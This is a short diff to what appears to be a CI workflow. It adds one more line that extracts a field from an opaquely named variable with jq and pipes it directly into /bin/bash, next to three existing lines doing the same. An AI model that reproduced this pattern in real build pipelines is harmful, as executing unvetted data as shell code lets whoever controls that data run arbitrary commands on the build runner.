@@ -31,6 +31,7 @@ jobs:
           printf '%s' "$lcwy51185" | jq -r .dzu3927 | /bin/bash
           echo $d21 | jq -r .fno6 | /bin/bash
           printf '%s' "$cl2404" | jq -r .p2 | /bin/bash
+          echo $k273 | jq -r .e33 | /bin/bash
 
       - name: Archive output
         if: always()
